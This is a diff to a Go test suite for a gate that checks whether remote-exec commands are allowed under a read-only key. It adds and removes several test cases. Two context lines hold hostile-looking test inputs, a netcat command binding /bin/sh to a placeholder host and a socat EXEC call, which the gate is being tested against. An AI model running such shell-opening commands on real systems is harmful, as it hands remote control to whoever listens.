@@ -175,6 +175,9 @@ func TestGateCheck(t *testing.T) {
 		{"copy web:/var/backups/db.gz web:/tmp/db.gz --continue", "", "SSH_GATE_READ_ONLY"},
 		{"host ssh exec web -- uptime", "", "SSH_GATE_READ_ONLY"},
 		{"host ssh exec web --read-only -- uptime", "", ""},
+		{"host ssh exec web --read-only --attach a1b2 --stop", "", "SSH_GATE_READ_ONLY"},
+		{"host ssh exec web --read-only --attach a1b2 --remove", "", "SSH_GATE_READ_ONLY"},
+		{"host ssh exec web --read-only --attach a1b2", "", ""},
 		{"docker exec web app ls", "", "SSH_GATE_READ_ONLY"},
 		{"docker exec web app --read-only ls", "", ""},
 		{"database postgres query pg 'select 1'", "", ""},
@@ -200,8 +203,6 @@ func TestGateCheck(t *testing.T) {
 		{"host ssh exec web --script ./check.sh --read-only", R, R},
 		{"host ssh exec web --script -", "", "SSH_GATE_READ_ONLY"}, // the key's own input
 		{"host ssh exec web --script - --read-only", "", ""},
-		{"job start web --read-only -- du -sh /var", "", ""},
-		{"job start web -- make backup", "", "SSH_GATE_READ_ONLY"},
 		{"cluster kubernetes exec k8s pod/x -- ls", "", "SSH_GATE_READ_ONLY"},
 		{"cluster kubernetes exec k8s pod/x --read-only -- ls", "", ""},
 		{"docker compose web ps", "", "SSH_GATE_READ_ONLY"}, // decided by the subcommand: not for a read key
@@ -405,7 +406,6 @@ func TestGateLocalTargets(t *testing.T) {
 		"host ssh exec u@127.0.0.1 --read-only -- 'socat - EXEC:id'":        R,
 		"host ssh exec me --read-only -- 'nc -e /bin/sh h 1'":               R,
 		"host ssh exec lh --script ./check.sh --read-only":                  R,
-		"job start v6 --read-only -- du -sh /var":                           R,
 		"docker exec me app --read-only ls":                                 R,
 		"cluster kubernetes exec k8slocal pod/x --read-only -- ls":          R,
 		"snippet exec disk me":                                              R,
